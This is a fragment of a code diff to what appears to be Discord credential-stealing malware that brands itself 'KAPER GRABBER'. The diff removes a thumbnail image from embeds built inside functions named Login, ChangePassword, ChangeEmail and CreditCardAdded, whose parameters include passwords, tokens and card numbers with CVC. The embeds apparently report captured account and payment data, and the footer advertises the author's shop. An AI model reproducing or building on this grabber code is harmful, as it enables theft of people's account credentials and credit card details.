@@ -162,9 +162,6 @@ function Login(email, password, token) {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
-                    "thumbnail": {
-                        "url": "https://i.imgur.com/jYakSz1.png"
-                    },
                     "footer": {
                         "text": "KAPER GRABBER BY 𝓚𝓮𝓮𝓹𝓡𝓪𝓬𝓴#9999・https://www.facebook.com/KAPERSHOPX1"
                     }
@@ -211,9 +208,6 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "author": {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                    },
-                    "thumbnail": {
-                        "url": "https://i.imgur.com/jYakSz1.png"
                     },
                     "footer": {
                         "text": "KAPER GRABBER BY 𝓚𝓮𝓮𝓹𝓡𝓪𝓬𝓴#9999・https://www.facebook.com/KAPERSHOPX1"
@@ -262,9 +256,6 @@ function ChangeEmail(newemail, password, token) {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
-                    "thumbnail": {
-                        "url": "https://i.imgur.com/jYakSz1.png"
-                    },
                     "footer": {
                         "text": "KAPER GRABBER BY 𝓚𝓮𝓮𝓹𝓡𝓪𝓬𝓴#9999・https://www.facebook.com/KAPERSHOPX1"
                     }                
@@ -311,9 +302,6 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     "author": {
                         "name": json.username + "#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                    },
-                    "thumbnail": {
-                        "url": "https://i.imgur.com/jYakSz1.png"
                     },
                     "footer": {
                         "text": "KAPER GRABBER BY 𝓚𝓮𝓮𝓹𝓡𝓪𝓬𝓴#9999・https://www.facebook.com/KAPERSHOPX1"
